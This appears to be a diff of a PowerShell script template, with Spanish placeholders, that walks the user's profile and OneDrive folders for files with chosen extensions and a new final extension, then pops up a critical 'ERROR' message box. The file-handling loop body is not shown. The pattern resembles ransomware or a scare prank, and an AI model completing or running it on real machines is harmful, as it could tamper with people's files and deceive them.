@@ -1,5 +1,7 @@
-$ext = {{LISTADO_EXTENSIONES}}
-$final_ext = "{{EXTENSION_FINAL}}"
+Start-job {
+
+$ext = {{LISTADO_EXTENSIONES}};
+$final_ext = "{{EXTENSION_FINAL}}";
 $user_dirs = "{{DIRECTORIOS}}";
 
 $base_dirs = @("$Env:USERPROFILE", "$Env:OneDrive");
@@ -18,3 +20,5 @@ foreach($base in $base_dirs){
     };
 }
 Add-Type -AssemblyName Microsoft.VisualBasic;[Microsoft.VisualBasic.Interaction]::MsgBox("{{MENSAJE_FINAL}}",'OKOnly,SystemModal,Critical', 'ERROR') *> $null;
+
+} | Wait-Job
